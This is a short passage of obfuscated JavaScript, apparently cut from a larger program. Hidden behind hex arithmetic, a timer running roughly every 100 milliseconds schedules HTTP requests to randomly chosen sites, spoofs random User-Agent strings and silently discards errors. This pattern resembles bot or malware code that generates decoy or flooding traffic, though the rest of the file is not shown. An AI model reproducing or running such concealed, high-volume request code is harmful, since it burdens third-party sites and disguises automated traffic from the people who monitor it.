    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xc0c + -0x18e + 0x2 * 0x1479) * getRandomInt(-0x22ae + 0x4 * -0x10 + 0x22ef, 0x21dd * 0x1 + -0x1 * 0x13fd + -0xddb));
}, -0x1ae7 + -0x478 + 0x1fc3);